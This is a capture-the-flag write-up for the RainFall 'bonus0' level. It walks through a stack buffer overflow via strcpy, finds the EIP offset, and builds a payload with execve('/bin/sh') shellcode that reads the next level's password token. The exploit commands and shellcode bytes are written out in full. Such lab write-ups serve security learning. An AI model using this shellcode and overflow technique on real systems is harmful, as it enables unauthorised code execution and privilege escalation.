Bonus0 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

Bonus0 rights:
```Shell
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```

Testing the binary:
```Shell
bonus0@RainFall:~$ ./bonus0
 - 
test
 - 
truc
test truc
```

Let's decompile it with Hex-Rays on https://dogbolt.org/ and see what is there:
- the code uses `strcpy()`and `strncpy()`, which we can exploit for a buffer overflow
- the resulting string is of size ARG1 + ARG2 + ONE-SPACE + ARG2
- the buffer in `main()`has a size of [42]
While testing the binary, we also realise that:
- arg1 will accept a maximum of 19 bytes and add a `\0`at the end of the string (with `strcpy()`), so if you give it 20 bytes it will continue reading past 20
- the buffers of arg1 and arg2 sit next to each other

We can therefore write a shellcode as a first argument, however ours is 21 bytes. So we can write the first 20 bytes, and start the second argument with 1 byte.

Next, we must find `EIP` to overwrite it. We know that the buffer is [42], so let's try to overflow it with a pattern of 20 bytes and 19 bytes. 20 is the maximum you can give to ARG1, and 19 is the maximum for ARG2 in order to null-terminate the string. If you don't null-terminate your string, `strcpy()` will read further in memory and add an unpredictable number of characters into the buffer, resulting in an unreliable number to base your offset on. The size of what we are sending will be 20 + 19 + 19 = 58 because ARG2 is copied twice.

```Shell
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa //20bytes
 - 
Aa0Aa1Aa2Aa3Aa4Aa5A //19bytes
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5A Aa0Aa1Aa2Aa3Aa4Aa5A

Program received signal SIGSEGV, Segmentation fault.
0x35614134 in ?? ()
```
This gives us 14. When you take 20(ARG1) + 19(ARG2) + 1(the space added) + 14(ARG2-SEGFAULT), you get an offset of 54.

Now we need the address of the start of the buffer (in which we stored our shellcode):
```Shell
bonus0@RainFall:~$ ltrace ./bonus0
[...]
strcpy(0xbffff736, "") = 0xbffff736
[...]
```
`ltrace` shows us that the first arg of `strcpy()` is the destination at which our input will be copied. It is therefore the address of our buffer!

These entire 54 bytes will be padded with:
- the shellcode
- `A`s for pure padding
- the address of the buffer
However, we must take into account the fact that the added space shifts our input by 1 byte. So we must take 1 byte out of the padding and put it at the end of our payload in order to make sure the address overwrites `EIP` correctly.

Finally, our two arguments will be:
- $(python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd")')
- $(python -c 'print("\x80" + "A" * 13  + "\xbf\xff\xf7\x36"[::-1] + "A")')

And the result is:
```Shell
level2@RainFall:~$ (python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd")'; python -c 'print("\x80" + "A" * 13  + "\xbf\xff\xf7\x36"[::-1] + "A")'; cat -) | ./bonus0
 - 
 - 
1���
    Qh//shh/bin��̀AAAAAAAAAAAAA6���A �AAAAAAAAAAAAA6���A
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
